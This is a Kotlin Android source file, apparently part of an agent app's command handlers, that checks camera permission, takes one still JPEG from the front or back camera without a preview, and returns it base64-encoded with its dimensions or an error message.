package com.alingo.agent.handlers

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

object CameraHandler {

    private const val TAG = "CameraHandler"

    @SuppressLint("MissingPermission")
    suspend fun capture(context: Context, facing: String): Map<String, Any?> =
        suspendCancellableCoroutine { cont ->

            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                cont.resume(mapOf("error" to "Camera permission not granted"))
                return@suspendCancellableCoroutine
            }

            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            if (cameraManager == null) {
                cont.resume(mapOf("error" to "CameraManager not available"))
                return@suspendCancellableCoroutine
            }

            val targetFacing = if (facing == "front")
                CameraCharacteristics.LENS_FACING_FRONT
            else
                CameraCharacteristics.LENS_FACING_BACK

            val cameraId = try {
                cameraManager.cameraIdList.find { id ->
                    val chars = cameraManager.getCameraCharacteristics(id)
                    chars.get(CameraCharacteristics.LENS_FACING) == targetFacing
                }
            } catch (e: Exception) { null }

            if (cameraId == null) {
                cont.resume(mapOf("error" to "No camera found for facing: $facing"))
                return@suspendCancellableCoroutine
            }

            // Pick suitable JPEG size
            val size = pickSize(cameraManager, cameraId) ?: android.util.Size(1280, 720)
            Log.i(TAG, "Using size: ${size.width}x${size.height}")

            val imageReader = ImageReader.newInstance(
                size.width, size.height, ImageFormat.JPEG, 2
            )

            var cameraDevice: CameraDevice? = null
            var completed = false

            fun cleanup() {
                try { cameraDevice?.close() } catch (e: Exception) {}
                try { imageReader.close() } catch (e: Exception) {}
            }

            imageReader.setOnImageAvailableListener({ reader ->
                if (completed) return@setOnImageAvailableListener
                val image = try { reader.acquireLatestImage() } catch (e: Exception) { null }
                    ?: return@setOnImageAvailableListener
                completed = true

                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    cleanup()

                    if (cont.isActive) {
                        cont.resume(mapOf(
                            "image_base64" to base64,
                            "facing" to facing,
                            "size" to bytes.size,
                            "width" to size.width,
                            "height" to size.height
                        ))
                    }
                } catch (e: Exception) {
                    cleanup()
                    if (cont.isActive) {
                        cont.resume(mapOf("error" to "Image read failed: ${e.message}"))
                    }
                }
            }, null)

            try {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(device: CameraDevice) {
                        cameraDevice = device
                        val surface = imageReader.surface
                        val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        request.addTarget(surface)

                        device.createCaptureSession(listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
                                        session.capture(request.build(), null, null)
                                    } catch (e: Exception) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(
                                            mapOf("error" to "Capture failed: ${e.message}")
                                        )
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    cleanup()
                                    if (cont.isActive) cont.resume(
                                        mapOf("error" to "Capture session config failed")
                                    )
                                }
                            }, null)
                    }

                    override fun onDisconnected(device: CameraDevice) {
                        cleanup()
                        if (cont.isActive) cont.resume(
                            mapOf("error" to "Camera disconnected")
                        )
                    }

                    override fun onError(device: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive) cont.resume(
                            mapOf("error" to "Camera error code: $error")
                        )
                    }
                }, null)
            } catch (e: Exception) {
                cleanup()
                if (cont.isActive) cont.resume(
                    mapOf("error" to "Camera open failed: ${e.message}")
                )
            }
        }

    private fun pickSize(cm: CameraManager, id: String): android.util.Size? {
        return try {
            val chars = cm.getCameraCharacteristics(id)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?: return null
            val sizes = map.getOutputSizes(ImageFormat.JPEG) ?: return null

            // Pick closest to 1280x720 but not larger than 1920x1080
            sizes.filter { it.width <= 1920 && it.height <= 1080 }
                .minByOrNull { kotlin.math.abs(it.width - 1280) + kotlin.math.abs(it.height - 720) }
                ?: sizes.minByOrNull { it.width * it.height }
        } catch (e: Exception) {
            null
        }
    }
}
